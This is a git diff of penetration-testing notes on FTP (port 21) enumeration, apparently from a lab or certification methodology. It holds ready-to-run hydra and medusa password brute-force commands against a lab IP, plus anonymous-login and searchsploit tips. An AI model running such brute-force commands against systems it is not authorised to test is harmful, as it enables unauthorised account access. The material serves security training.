@@ -13,8 +13,8 @@ example usage:
 ## FTP (21/tcp)
 * anonymous login (anonymous anonymous)
 * Bruteforce login (done by autorecon.sh with hydra and medusa)
-* manual examples:
-`hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/root/Desktop/19.11.1.20/scans/tcp_21_ftp_hydra.txt" ftp://19.11.1.2`
+* manual examples:<br/>
+`hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/root/Desktop/19.11.1.20/scans/tcp_21_ftp_hydra.txt" ftp://19.11.1.2`<br/>
 `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/root/Desktop/19.11.1.20/scans/tcp_21_ftp_medusa.txt" -M ftp -h 19.11.1.2`
 * FTP vulnerable itself? searchsploit it.
 ## SSH (22/tcp)
